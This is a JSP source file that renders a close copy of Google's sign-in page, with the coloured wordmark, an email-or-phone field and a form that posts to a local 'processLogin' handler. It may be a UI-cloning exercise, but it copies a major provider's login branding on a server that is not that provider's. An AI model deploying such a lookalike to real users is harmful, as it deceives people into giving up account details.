<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Google Login</title>
    <style>
        body {
            font-family: "Product Sans", Arial, sans-serif;
            background: #fff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
        }
        .container {
            width: 360px;
            margin-top: 80px;
            text-align: center;
        }
        .google-logo {
            font-weight: 400;
            font-size: 60px;
            letter-spacing: 2px;
        }
        .google-logo .g { color: #4285F4; }
        .google-logo .o1 { color: #EA4335; }
        .google-logo .o2 { color: #FBBC05; }
        .google-logo .g2 { color: #4285F4; }
        .google-logo .l { color: #34A853; }
        .google-logo .e { color: #EA4335; }

        h1 {
            font-weight: 400;
            font-size: 26px;
            margin-bottom: 0;
            margin-top: 16px;
        }
        .subtitle {
            font-size: 15px;
            color: #5f6368;
            margin-top: 0;
            margin-bottom: 24px;
        }
        input[type="text"] {
            width: 100%;
            height: 44px;
            font-size: 16px;
            padding: 0 10px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            outline: none;
            box-sizing: border-box;
            margin-bottom: 12px;
        }
        input[type="text"]:focus {
            border-color: #4285f4;
            box-shadow: 0 1px 2px rgba(66, 133, 244, 0.3);
        }
        .link {
            color: #1a73e8;
            font-size: 14px;
            text-decoration: none;
            margin-bottom: 24px;
            display: inline-block;
        }
        .info {
            font-size: 13px;
            color: #3c4043;
            margin-bottom: 8px;
        }
        .btn-next {
            background-color: #1a73e8;
            color: white;
            font-size: 14px;
            font-weight: 500;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            cursor: pointer;
            box-shadow: 0 2px 4px rgb(0 0 0 / 0.2);
            float: right;
            margin-top: 12px;
        }
        .btn-next:active {
            box-shadow: none;
        }
        .clearfix::after {
            content: "";
            display: table;
            clear: both;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="google-logo">
        <span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
    </div>
    <h1>Sign in</h1>
    <div class="subtitle">Use your Google Account</div>
    <form action="processLogin" method="post">
        <input type="text" name="emailOrPhone" placeholder="Email or phone" required>
        <div style="text-align: left;">
            <a href="#" class="link">Forget email ?</a>
        </div>
        <div class="info">
            Not your computer. Use guest mode to sign in privately
        </div>
        <a href="#" class="link">Learn more</a>
        <div>
            <a href="#" class="link">Create Account</a>
            <button type="submit" class="btn-next">Next</button>
        </div>
    </form>
</div>
</body>
</html>
